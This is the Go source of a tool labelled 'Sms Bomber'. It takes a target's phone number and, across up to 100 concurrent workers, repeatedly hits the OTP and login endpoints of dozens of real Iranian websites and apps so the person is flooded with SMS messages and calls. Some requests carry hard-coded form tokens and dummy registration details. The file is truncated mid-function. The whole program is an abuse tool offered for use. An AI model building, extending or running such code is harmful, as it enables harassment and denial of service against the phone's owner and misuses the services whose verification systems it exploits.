package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net" 
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"    
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done() 

	const maxRetries = 3          
	const retryDelay = 2 * time.Second 

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): 
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { 
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue 
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { 
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue 
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError 
					return
				}
				time.Sleep(retryDelay)
				continue 
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close() 
		return 
	}
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3           
	const retryDelay = 3 * time.Second 

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done(): 
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0 
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 { 
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue 
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError 
					return
				}
				time.Sleep(retryDelay)
				continue 
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0 
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close() 
		return 
	}
}
func sendGETRequest(ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil) // متد GET و Body = nil
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return 
	}
}
func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}
func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-  faster    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int 

	switch strings.ToLower(speedChoice) { 
	case "fast":

		numWorkers = 100 
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":

		numWorkers = 30 
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:

		numWorkers = 30 
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

	tasks := make(chan func(), repeatCount*40)


	var wg sync.WaitGroup

	ch := make(chan int, repeatCount*40)

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	for i := 0; i < repeatCount; i++ {
		



		// https://admin.zoodex.ir/api/v2/login/check?need_sms=1 (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://admin.zoodex.ir/api/v2/login/check?need_sms=1", map[string]interface{}{
				"mobile": phone, 
			}, &wg, ch)
		}
		// https://api6.arshiyaniha.com/api/v2/client/otp/send (JSON) -
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api6.arshiyaniha.com/api/v2/client/otp/send", map[string]interface{}{
				"cellphone": "0" + getPhoneNumber98NoZero(phone), 
				"country_code": "98",
			}, &wg, ch)
		}
		// https://poltalk.me/api/v1/auth/phone (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://poltalk.me/api/v1/auth/phone", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		// https://refahtea.ir/wp-admin/admin-ajax.php (Form Data)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "refah_send_code") 
			formData.Set("mobile", phone) 
			formData.Set("security", "placeholder") 

			sendFormRequest(ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}
		// https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber=09123456456 (GET)
		wg.Add(1)
		tasks <- func() {
			urlWithPhone := fmt.Sprintf("https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber=%s", phone) 
			sendGETRequest(ctx, urlWithPhone, &wg, ch)
		}
		// https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/09123456456/sms?cCode=%2B98 (GET)
		wg.Add(1)
		tasks <- func() {
			urlWithPhone := fmt.Sprintf("https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/%s/sms?cCode=+98", phone)
		}
		// https://pirankalaco.ir/SendPhone.php (Form Data)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("phone", phone) 
			sendFormRequest(ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch)
		}
		// https://gharar.ir/users/phone_number/ (Form Data)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("phone", phone) 
			sendFormRequest(ctx, "https://gharar.ir/users/phone_number/", formData, &wg, ch)
		}
                // https://www.irantic.com/api/login/authenticate (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
				"mobile": phone, 
			}, &wg, ch)
		}
			// gifkart.com (SMS - POST Form)
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("PhoneNumber", phone) 
				sendFormRequest(ctx, "https://gifkart.com/request/", formData, &wg, ch)
			}
			// gamefa.com (Register flow 2 - SMS OTP step - POST Form)
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("action", "digits_forms_ajax")
				formData.Set("type", "register")
				formData.Set("digt_countrycode", "+98")
				formData.Set("phone", getPhoneNumberNoZero(phone)) 
				formData.Set("email", "koyaref766@kazvi.com")    
				formData.Set("digits_reg_password", "trrdfstrtft")
				formData.Set("digits_process_register", "1")      
				formData.Set("sms_otp", "")                     
				formData.Set("otp_step_1", "1")                    
				formData.Set("digits_otp_field", "1")            
				formData.Set("instance_id", "74e5368dbcf91c938f44b2af4b21cb3a")
				formData.Set("optional_data", "optional_data")               
				formData.Set("dig_otp", "otp") 
				formData.Set("digits", "1")
				formData.Set("digits_redirect_page", "//gamefa.com/")
				formData.Set("digits_form", "3827f92f86") 
				formData.Set("_wp_http_referer", "/?login=true")
				formData.Set("container", "digits_protected") 
				formData.Set("sub_action", "sms_otp")         
				sendFormRequest(ctx, "https://gamefa.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
                       // virgool.io (verify - POST JSON)
			wg.Add(1)
			tasks <- func() {
				payload := map[string]interface{}{
					"method":     "phone",                           
					"identifier": getPhoneNumberPlus98NoZero(phone), 
					"type":       "register",                        
				}
				sendJSONRequest(ctx, "https://virgool.io/api2/app/auth/verify", payload, &wg, ch)
			}
			// mediana.ir (POST JSON)
			wg.Add(1)
			tasks <- func() {
				payload := map[string]interface{}{
					"phone":    phone, 
					"referrer": "",    
				}
				sendJSONRequest(ctx, "https://app.mediana.ir/api/account/AccountApi/CreateOTPWithPhone", payload, &wg, ch)
			}
			// lintagame.com (POST Form)
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("action", "logini_first")
				formData.Set("login", phone) 
				sendFormRequest(ctx, "https://lintagame.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
			// account.api.balad.ir (POST JSON)
			wg.Add(1)
			tasks <- func() {
				payload := map[string]interface{}{
					"phone_number": phone, 
					"os_type":      "W",   
				}
				sendJSONRequest(ctx, "https://account.api.balad.ir/api/web/auth/login/", payload, &wg, ch)
			}
			// core-api.mayava.ir (POST JSON)
			wg.Add(1)
			tasks <- func() {
				payload := map[string]interface{}{
					"mobile": phone, 
				}
				sendJSONRequest(ctx, "https://core-api.mayava.ir/auth/check", payload, &wg, ch)
			}
			// pgemshop.com (POST Form)
			wg.Add(1)
			tasks <- func() {
				formData := url.Values{}
				formData.Set("action", "digits_check_mob")
				formData.Set("countrycode", "+98")
				formData.Set("mobileNo", phone) 
				formData.Set("csrf", "0a60a620d9") 
				formData.Set("login", "2")
				formData.Set("username", "")
				formData.Set("email", "")
				formData.Set("captcha", "")
				formData.Set("captcha_ses", "")
				formData.Set("json", "1")
				formData.Set("whatsapp", "0")
				sendFormRequest(ctx, "https://pgemshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
			// api.cafebazaar.ir (POST JSON)
			wg.Add(1)
			tasks <- func() {
				payload := map[string]interface{}{
					"properties": map[string]interface{}{
						"language":      2,
						"clientID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx", 
						"clientVersion": "web",                        
						"deviceID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx", 
					},
					"singleRequest": map[string]interface{}{
						"getOtpTokenRequest": map[string]interface{}{
							"username": getPhoneNumber98NoZero(phone),
						},
					},
				}
				sendJSONRequest(ctx, "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", payload, &wg, ch)
			}
     // harikashop.com 
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("id_customer", "")
        formData.Set("firstname", "Test")
        formData.Set("lastname", "User") 
        formData.Set("password", "TestPass123") 
        formData.Set("action", "register")
        formData.Set("username", phone)
        formData.Set("ajax", "1")
        sendFormRequest(ctx, "https://harikashop.com/login?back=https%3A%2F%2Fharikashop.com%2F", formData, &wg, ch)
    }
       // digistyle.com
     wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("loginRegister[email_phone]", phone)
        sendFormRequest(ctx, "https://www.digistyle.com/users/login-register/", formData, &wg, ch)
    }

    // api.nobat.ir
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("mobile", phone[1:]) 
        formData.Set("use_emta_v2", "yes")
        formData.Set("domain", "nobat")
        sendFormRequest(ctx, "https://api.nobat.ir/patient/login/phone", formData, &wg, ch)
    }
    // snapp.market
     wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("cellphone", phone)
        urlWithQuery := "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=" + phone
        sendFormRequest(ctx, urlWithQuery, formData, &wg, ch)
    }
    // sabziman.com 
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("action", "newphoneexist")
        formData.Set("phonenumber", phone)
        sendFormRequest(ctx, "https://sabziman.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }
    // api.achareh.co 
    wg.Add(1)
    tasks <- func() {
         payload := map[string]interface{}{
            "phone": "98" + phone[1:], 
        }
        urlWithQuery := "https://api.achareh.co/v2/accounts/login/?web=true"
        sendJSONRequest(ctx, urlWithQuery, payload, &wg, ch)
    }
		// sabziman.com (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "newphoneexist")
			formData.Set("phonenumber", phone)
			sendFormRequest(ctx, "https://sabziman.com/wp-admin/admin-ajax.php", formData, &wg, ch)
		}
		// ghasedak24.com (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobile", phone)
			sendFormRequest(ctx, "https://ghasedak24.com/user/otp", formData, &wg, ch)
		}
		// api6.arshiyaniha.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api6.arshiyaniha.com/api/v2/client/otp/send", map[string]interface{}{
				"cellphone":    phone,
				"country_code": "98",
			}, &wg, ch)
		}
// bigtoys.ir - Variation 3 (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action_type", "phone")
			formData.Set("digt_countrycode", "+98")
			formData.Set("phone", strings.TrimPrefix(phone, "0")) 
			formData.Set("email", "")
			formData.Set("digits_reg_name", "abcdefghl")
			formData.Set("digits_reg_password", "qzF8w7UAZusAJdg") 
			formData.Set("digits_process_register", "1")
			formData.Set("optional_email", "")
			formData.Set("is_digits_optional_data", "1")
			formData.Set("sms_otp", "")
			formData.Set("otp_step_1", "1")
			formData.Set("signup_otp_mode", "1")
			formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222")
			formData.Set("optional_data", "email")
			formData.Set("action", "digits_forms_ajax")
			formData.Set("type", "register")
			formData.Set("dig_otp", "")
			formData.Set("digits", "1")
			formData.Set("digits_redirect_page", "//www.bigtoys.ir/") 
			formData.Set("digits_form", "3bed3c0f10")                
			formData.Set("_wp_http_referer", "/")
			formData.Set("container", "digits_protected")
			formData.Set("sub_action", "sms_otp")
			sendFormRequest(ctx, "https://www.bigtoys.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}

		// mamifood.org - SendValidationCode (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://mamifood.org/Registration.aspx/SendValidationCode", map[string]interface{}{
				"Phone": phone,
				"did":   "ecdb7f59-9aee-41f5-b0b1-65cde6bf1791",
			}, &wg, ch)
		}
		// platform-api.snapptrip.com - request-otp (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://platform-api.snapptrip.com/profile/auth/request-otp", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}
		// okala.com - OTPRegister (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister", map[string]interface{}{
				"mobile":                     phone,
				"confirmTerms":               true,
				"notRobot":                   false,
				"ValidationCodeCreateReason": 5,
				"OtpApp":                     0,
				"IsAppOnly":                  false,
				"deviceTypeCode":             7,

			}, &wg, ch)
		}
		// see5.net (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("mobile", phone)
			formData.Set("name", "sfsfsfsffsf") 
			formData.Set("demo", "bz_sh_fzltprxh")
			sendFormRequest(ctx, "https://see5.net/wp-content/themes/see5/webservice_demo2.php", formData, &wg, ch)
		}
                // 2. itmall.ir (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("action", "digits_check_mob")
			formData.Set("countrycode", "+98")
			formData.Set("mobileNo", phone)
			formData.Set("csrf", "e57d035242")
			formData.Set("login", "2")
			formData.Set("username", "")
			formData.Set("email", "")
			formData.Set("captcha", "")
			formData.Set("captcha_ses", "")
			formData.Set("json", "1")
			formData.Set("whatsapp", "0")
			sendFormRequest(ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
		}
		// 3. api.mootanroo.com (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.mootanroo.com/api/v3/auth/fadce78fbac84ba7887c9942ae460e0c/send-otp", map[string]interface{}{
				"PhoneNumber": phone, 
			}, &wg, ch)
		}

		// 4. accounts.khanoumi.com (Form)
		wg.Add(1)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("applicationId", "b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e") 
			formData.Set("loginIdentifier", phone) 
			formData.Set("loginSchemeName", "sms")
			sendFormRequest(ctx, "https://accounts.khanoumi.com/account/login/init", formData, &wg, ch)
		}

                // virgool.io (JSON) 
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
				"method":     "phone",
				"identifier": phone,
			}, &wg, ch)
		}
		// virgool.io (JSON)
		wg.Add(1)
		tasks <- func() {
			sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // virgool.io (JSON) 
		tasks <- func() {
			sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
				"identifier": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digistyle.com (Form)
		tasks <- func() {
			formData := url.Values{}
			formData.Set("loginRegister[email_phone]", phone)
			sendFormRequest(ctx, "https://www.digistyle.com/users/login-register/", formData, &wg, ch)
		}
		wg.Add(1) // sandbox.sibbazar.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://sandbox.sibbazar.com/api/v1/user/generator-inv-token", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // core.gapfilm.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://core.gapfilm.ir/api/v3.2/Account/Login", map[string]interface{}{
				"PhoneNo": phone,
			}, &wg, ch)
		}
		wg.Add(1) // api.pindo.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.pindo.ir/v1/user/login-register/", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // divar.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // shab.ir login-otp (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // shab.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{
				"mobile":       phone,
				"country_code": "+98",
			}, &wg, ch)
		}
		wg.Add(1) // Mobinnet (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": phone}, &wg, ch)
		}
		wg.Add(1) // api.ostadkr.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.ostadkr.com/login", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digikalajet.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.digikalajet.ir/user/login-register/", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // iranicard.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.iranicard.ir/api/v1/register", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // alopeyk.com (JSON) - sms
		tasks <- func() {
			sendJSONRequest(ctx, "https://alopeyk.com/api/sms/send.php", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // alopeyk.com (JSON) - login
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // pinket.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{
				"phoneNumber": phone,
			}, &wg, ch)
		}
		wg.Add(1) // otaghak.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // banimode.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // gw.jabama.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://gw.jabama.com/api/v4/account/send-code", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // jabama.com (JSON) - taraazws
		tasks <- func() {
			sendJSONRequest(ctx, "https://taraazws.jabama.com/api/v4/account/send-code", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // torobpay.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.torobpay.com/user/v1/login/", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}
		wg.Add(1) // sheypoor.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.sheypoor.com/api/v10.0.0/auth/send", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // miare.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}
		wg.Add(1) // pezeshket.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
				"mobileNumber": phone,
			}, &wg, ch)
		}
		wg.Add(1) // classino.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // snapp.taxi (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
				"cellphone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // api.snapp.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // snapp.market(JSON)
		tasks <- func() {
			sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{
				"cellphone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // digikala.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
				"username": phone,
			}, &wg, ch)
		}
		wg.Add(1) // ponisha.ir (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // bitycle.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
				"phone": phone,
			}, &wg, ch)
		}
		wg.Add(1) // barghman (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://uiapi2.saapa.ir/api/otp/sendCode", map[string]interface{}{
				"mobile": phone,
			}, &wg, ch)
		}
		wg.Add(1) // komodaa.com (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://api.komodaa.com/api/v2.6/loginRC/request", map[string]interface{}{
				"phone_number": phone,
			}, &wg, ch)
		}
		wg.Add(1) // anargift.com auth (JSON)
		tasks <- func() {
			sendJSONRequest(ctx, "https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
